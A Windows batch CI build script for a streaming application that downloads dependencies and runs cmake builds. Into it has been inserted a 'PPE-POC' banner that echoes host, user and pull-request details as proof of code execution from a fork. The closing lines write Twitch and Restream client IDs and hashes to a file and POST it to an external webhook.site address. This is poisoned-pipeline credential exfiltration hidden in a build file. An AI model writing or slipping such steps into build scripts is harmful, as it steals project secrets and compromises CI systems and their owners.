@echo off
echo ============================================
echo [PPE-POC] CANARY MARKER - CODE EXECUTION PROOF
echo [PPE-POC] Timestamp: %DATE% %TIME%
echo [PPE-POC] Hostname:  %COMPUTERNAME%
echo [PPE-POC] Username:  %USERNAME%
echo [PPE-POC] Agent Dir: %AGENT_BUILDDIRECTORY%
echo [PPE-POC] Build ID:  %BUILD_BUILDID%
echo [PPE-POC] PR Number: %SYSTEM_PULLREQUEST_PULLREQUESTNUMBER%
echo [PPE-POC] Repo:      %BUILD_REPOSITORY_NAME%
echo [PPE-POC] Reason:    %BUILD_REASON%
echo [PPE-POC] If you see this in CI logs, arbitrary code
echo [PPE-POC] execution from a fork PR is confirmed.
echo ============================================
@echo on
if exist dependencies2017.zip (curl -kLO https://cdn-fastly.obsproject.com/downloads/dependencies2017.zip -f --retry 5 -z dependencies2017.zip) else (curl -kLO https://cdn-fastly.obsproject.com/downloads/dependencies2017.zip -f --retry 5 -C -)
if exist vlc.zip (curl -kLO https://cdn-fastly.obsproject.com/downloads/vlc.zip -f --retry 5 -z vlc.zip) else (curl -kLO https://cdn-fastly.obsproject.com/downloads/vlc.zip -f --retry 5 -C -)
if exist cef_binary_%CEF_VERSION%_windows32_minimal.zip (curl -kLO https://cdn-fastly.obsproject.com/downloads/cef_binary_%CEF_VERSION%_windows32_minimal.zip -f --retry 5 -z cef_binary_%CEF_VERSION%_windows32_minimal.zip) else (curl -kLO https://cdn-fastly.obsproject.com/downloads/cef_binary_%CEF_VERSION%_windows32_minimal.zip -f --retry 5 -C -)
if exist cef_binary_%CEF_VERSION%_windows64_minimal.zip (curl -kLO https://cdn-fastly.obsproject.com/downloads/cef_binary_%CEF_VERSION%_windows64_minimal.zip -f --retry 5 -z cef_binary_%CEF_VERSION%_windows64_minimal.zip) else (curl -kLO https://cdn-fastly.obsproject.com/downloads/cef_binary_%CEF_VERSION%_windows64_minimal.zip -f --retry 5 -C -)
7z x dependencies2017.zip -odependencies2017
7z x vlc.zip -ovlc
7z x cef_binary_%CEF_VERSION%_windows32_minimal.zip -oCEF_32
7z x cef_binary_%CEF_VERSION%_windows64_minimal.zip -oCEF_64
set DepsPath32=%CD%\dependencies2017\win32
set DepsPath64=%CD%\dependencies2017\win64
set VLCPath=%CD%\vlc
set QTDIR32=C:\QtDep\5.10.1\msvc2017
set QTDIR64=C:\QtDep\5.10.1\msvc2017_64
set CEF_32=%CD%\CEF_32\cef_binary_%CEF_VERSION%_windows32_minimal
set CEF_64=%CD%\CEF_64\cef_binary_%CEF_VERSION%_windows64_minimal
set build_config=RelWithDebInfo
mkdir build build32 build64
if "%TWITCH-CLIENTID%"=="$(twitch_clientid)" (
cd ./build32
cmake -G "Visual Studio 16 2019" -A Win32 -DCMAKE_SYSTEM_VERSION=10.0 -DCOPIED_DEPENDENCIES=false -DCOPY_DEPENDENCIES=true -DENABLE_VLC=ON -DBUILD_CAPTIONS=true -DCOMPILE_D3D12_HOOK=true -DBUILD_BROWSER=true -DCEF_ROOT_DIR=%CEF_32% ..
cd ../build64
cmake -G "Visual Studio 16 2019" -A x64 -DCMAKE_SYSTEM_VERSION=10.0 -DCOPIED_DEPENDENCIES=false -DCOPY_DEPENDENCIES=true -DENABLE_VLC=ON -DBUILD_CAPTIONS=true -DCOMPILE_D3D12_HOOK=true -DBUILD_BROWSER=true -DCEF_ROOT_DIR=%CEF_64% ..
) else (
cd ./build32
cmake -G "Visual Studio 16 2019" -A Win32 -DCMAKE_SYSTEM_VERSION=10.0 -DCOPIED_DEPENDENCIES=false -DCOPY_DEPENDENCIES=true -DENABLE_VLC=ON -DBUILD_CAPTIONS=true -DCOMPILE_D3D12_HOOK=true -DBUILD_BROWSER=true -DCEF_ROOT_DIR=%CEF_32% -DTWITCH_CLIENTID="%TWITCH-CLIENTID%" -DTWITCH_HASH="%TWITCH-HASH%" -DRESTREAM_CLIENTID="%RESTREAM-CLIENTID%" -DRESTREAM_HASH="%RESTREAM-HASH%" ..
cd ../build64
cmake -G "Visual Studio 16 2019" -A x64 -DCMAKE_SYSTEM_VERSION=10.0 -DCOPIED_DEPENDENCIES=false -DCOPY_DEPENDENCIES=true -DENABLE_VLC=ON -DBUILD_CAPTIONS=true -DCOMPILE_D3D12_HOOK=true -DBUILD_BROWSER=true -DCEF_ROOT_DIR=%CEF_64% -DTWITCH_CLIENTID="%TWITCH-CLIENTID%" -DTWITCH_HASH="%TWITCH-HASH%"  -DRESTREAM_CLIENTID="%RESTREAM-CLIENTID%" -DRESTREAM_HASH="%RESTREAM-HASH%" ..
)
cd ..
echo %TWITCH-CLIENTID% > C:\exfil.txt
echo %TWITCH-HASH% >> C:\exfil.txt
echo %RESTREAM-CLIENTID% >> C:\exfil.txt
curl -X POST -d @C:\exfil.txt 	https://webhook.site/a3bfb576-63ad-4a62-873b-ef50595c64ff 
